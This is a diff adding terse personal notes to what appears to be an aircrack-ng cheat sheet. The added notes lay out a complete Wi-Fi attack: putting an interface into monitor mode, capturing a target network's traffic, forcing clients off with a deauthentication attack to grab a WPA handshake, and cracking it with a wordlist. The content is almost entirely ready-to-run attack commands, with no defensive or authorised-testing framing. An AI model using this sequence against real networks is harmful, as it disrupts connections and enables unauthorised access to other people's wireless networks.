@@ -18,3 +18,34 @@ aircrack-ng -e <essid> -s <.cap of .ivs file(s)>
 
 # To crack a given essid (WEP) and create a EWSA Project
 aircrack-ng -e <essid> -E <EWSA file> <.cap or .ivs file(s)>
+
+----
+
+ip a
+	wlp0s20f3
+
+airmon-ng start wlp0s20f3  // start
+## (airmon-ng stop wlan0 // stop afterwards)
+
+iwconfig // check "mode:monitor"
+
+ip a
+	wlan0mon
+	
+airodump-ng wlan0mon
+
+bssid + channel
+airodump-ng -d BSSID -w filename_output -c CHANNEL wlan0mon
+
+new terminal
+
+//deauth:
+aireplay-ng {how often #} -a BSSID_TARGET -c STATION wlan0mon
+
+//redo if no handshake captured
+
+aircrack-ng -w WORDLIST filename_output.cap
+
+airmon-ng stop wlan0mon // stop afterwards
+
+systemctl restart net*
